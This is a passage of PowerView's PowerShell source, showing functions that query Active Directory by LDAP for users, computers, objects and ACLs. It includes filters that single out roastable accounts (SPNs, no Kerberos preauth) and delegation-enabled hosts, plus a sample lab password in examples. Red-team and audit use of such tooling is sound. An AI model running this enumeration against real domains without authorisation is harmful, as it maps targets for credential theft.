        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $UserSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning "[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $UserName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$UserName)"
                        $SearcherArguments['Domain'] = $UserDomain
                        Write-Verbose "[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                }
            }

            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[Get-DomainUser] Searching for non-null service principal names'
                $Filter += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who can be delegated'
                # negation of "Accounts that are sensitive and not trusted for delegation"
                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[Get-DomainUser] Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainUser] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            # build the LDAP filter for the dynamic UAC filter value
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            Write-Verbose "[Get-DomainUser] filter string: $($UserSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }
            else { $Results = $UserSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = Convert-LDAPProperty -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainUser] Error disposing of the Results object: $_"
                }
            }
            $UserSearcher.dispose()
        }
    }
}

function Get-DomainComputer {
<#
.SYNOPSIS

Return all computers or specific computer objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all computer objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. WINDOWS10$), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),
or a dns host name (e.g. windows10.testlab.local). Wildcards accepted.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from $UACEnum, including
"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.

.PARAMETER Unconstrained

Switch. Return computer objects that have unconstrained delegation.

.PARAMETER TrustedToAuth

Switch. Return computer objects that are trusted to authenticate for other principals.

.PARAMETER Printers

Switch. Return only printers.

.PARAMETER SPN

Return computers with a specific service principal name, wildcards accepted.

.PARAMETER OperatingSystem

Return computers with a specific operating system, wildcards accepted.

.PARAMETER ServicePack

Return computers with a specific service pack, wildcards accepted.

.PARAMETER SiteName

Return computers in the specific AD Site name, wildcards accepted.

.PARAMETER Ping

Switch. Ping each host to ensure it's up before enumerating.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainComputer

Returns the current computers in current domain.

.EXAMPLE

Get-DomainComputer -SPN mssql* -Domain testlab.local

Returns all MS SQL servers in the testlab.local domain.

.EXAMPLE

Get-DomainComputer -UACFilter TRUSTED_FOR_DELEGATION,SERVER_TRUST_ACCOUNT -Properties dnshostname

Return the dns hostnames of servers trusted for delegation.

.EXAMPLE

Get-DomainComputer -SearchBase "LDAP://OU=secret,DC=testlab,DC=local" -Unconstrained

Search the specified OU for computeres that allow unconstrained delegation.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainComputer -Credential $Cred

.OUTPUTS

PowerView.Computer

Custom PSObject with translated computer property fields.

PowerView.Computer.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $Identity,

        [Switch]
        $Unconstrained,

        [Switch]
        $TrustedToAuth,

        [Switch]
        $Printers,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,

        [ValidateNotNullOrEmpty()]
        [String]
        $OperatingSystem,

        [ValidateNotNullOrEmpty()]
        [String]
        $ServicePack,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # add in the negations
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $CompSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($CompSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $CompSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $CompSearcher) {
                            Write-Warning "[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                else {
                    $IdentityFilter += "(name=$IdentityInstance)"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers with for unconstrained delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[Get-DomainComputer] Searching for printers'
                $Filter += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $SPN"
                $Filter += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
                $Filter += "(operatingsystem=$OperatingSystem)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with service pack: $ServicePack"
                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with site name: $SiteName"
                $Filter += "(serverreferencebl=$SiteName)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            # build the LDAP filter for the dynamic UAC filter value
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }
            else { $Results = $CompSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        # return raw result objects
                        $Computer = $_
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $Computer = Convert-LDAPProperty -Properties $_.Properties
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $Computer
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainComputer] Error disposing of the Results object: $_"
                }
            }
            $CompSearcher.dispose()
        }
    }
}

function Get-DomainObject {
<#
.SYNOPSIS

Return all (or specified) domain objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-ADName  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from $UACEnum, including
"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainObject -Domain testlab.local

Return all objects for the testlab.local domain

.EXAMPLE

'S-1-5-21-890171859-3433809279-3366196753-1003', 'CN=dfm,CN=Users,DC=testlab,DC=local','b6a9a2fb-bbd5-4f28-9a09-23213cea6693','dfm.a' | Get-DomainObject -Properties distinguishedname

distinguishedname
-----------------
CN=PRIMARY,OU=Domain Controllers,DC=testlab,DC=local
CN=dfm,CN=Users,DC=testlab,DC=local
OU=OU3,DC=testlab,DC=local
CN=dfm (admin),CN=Users,DC=testlab,DC=local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainObject -Credential $Cred -Identity 'windows1'

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

'testlab\harmj0y','DEV\Domain Admins' | Get-DomainObject -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainUser] Extracted domain 'testlab.local' from 'testlab\harmj0y'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=harmj0y)))

distinguishedname
-----------------
CN=harmj0y,CN=Users,DC=testlab,DC=local
VERBOSE: [Get-DomainUser] Extracted domain 'dev.testlab.local' from 'DEV\Domain Admins'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=Domain Admins)))
CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local

.OUTPUTS

PowerView.ADObject

Custom PSObject with translated AD object property fields.

PowerView.ADObject.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # add in the negations
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($ObjectSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^(CN|OU|DC)=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObject] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $ObjectSearcher) {
                            Write-Warning "[Get-DomainObject] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $ObjectDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $ObjectName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$ObjectName)"
                        $SearcherArguments['Domain'] = $ObjectDomain
                        Write-Verbose "[Get-DomainObject] Extracted domain '$ObjectDomain' from '$IdentityInstance'"
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainObject] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            # build the LDAP filter for the dynamic UAC filter value
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if ($Filter -and $Filter -ne '') {
                $ObjectSearcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $ObjectSearcher.FindOne() }
            else { $Results = $ObjectSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = Convert-LDAPProperty -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainObject] Error disposing of the Results object: $_"
                }
            }
            $ObjectSearcher.dispose()
        }
    }
}

function Get-DomainObjectAcl {
<#
.SYNOPSIS

Returns the ACLs associated with a specific active directory object. By default
the DACL for the object(s) is returned, but the SACL can be returned with -Sacl.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainGUIDMap  

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Sacl

Switch. Return the SACL instead of the DACL for the object (default behavior).

.PARAMETER ResolveGUIDs

Switch. Resolve GUIDs to their display names.

.PARAMETER RightsFilter

A specific set of rights to return ('All', 'ResetPassword', 'WriteMembers').

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectAcl -Identity matt.admin -domain testlab.local -ResolveGUIDs

Get the ACLs for the matt.admin user in the testlab.local domain and
resolve relevant GUIDs to their display names.

.EXAMPLE

Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs

Enumerate the ACL permissions for all OUs in the domain.

.EXAMPLE

Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs -Sacl

Enumerate the SACLs for all OUs in the domain, resolving GUIDs.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
